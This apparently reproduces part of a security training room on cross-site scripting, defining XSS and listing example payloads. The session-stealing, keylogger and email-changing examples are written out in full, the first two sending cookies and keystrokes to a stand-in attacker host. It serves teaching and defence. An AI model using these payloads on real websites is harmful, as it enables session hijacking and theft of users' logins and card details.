## 1. Room Brief

**Prerequisites:**  
It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.

==DEF-Cross-Site Scripting, better known as XSS in the cybersecurity community, is a type of web security vulnerability that allows an attacker to inject malicious scripts (usually JavaScript) into otherwise trusted websites or web applications.== In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.

## 2. XSS Payloads

### What is a payload?

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).

Here are some examples of XSS intentions.

</div>

### Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

`<script>alert('XSS');</script>`
<div>
<br>
</div>

### Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  
<div>
<br>
</div>

### Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
<div>
<br>
</div>

### Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

`<script>user.changeEmail('attacker@hacker.thm');</script>`

Now that the email address for the account has changed, the attacker may perform a reset password attack.

The next four tasks are going to cover the different types of XSS Vulnerabilities, all requiring slightly different attack payloads and user interaction.
